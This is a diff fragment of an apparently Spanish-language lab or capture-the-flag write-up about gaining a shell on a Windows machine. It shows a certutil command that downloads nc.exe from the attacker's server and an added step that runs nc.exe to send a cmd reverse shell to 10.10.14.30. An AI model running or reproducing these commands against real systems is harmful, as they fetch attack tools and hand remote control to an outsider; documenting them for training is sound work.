@@ -345,3 +345,8 @@ system("certutil.exe -f -urlcache -split http://10.10.14.30/nc.exe C:\\Windows\\
 vemos las peticiones en nuestro servidor lo que nos indica que se acaba de descargar el nc.exe
 ![[Pasted image 20240520173318.png]]
 
+### conexión
+ahora usaremos un nuevo comando para ejecutar el nc.exe y establecer una conexion con nuestra ma
+```python
+system("C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd 10.10.14.30");
+```
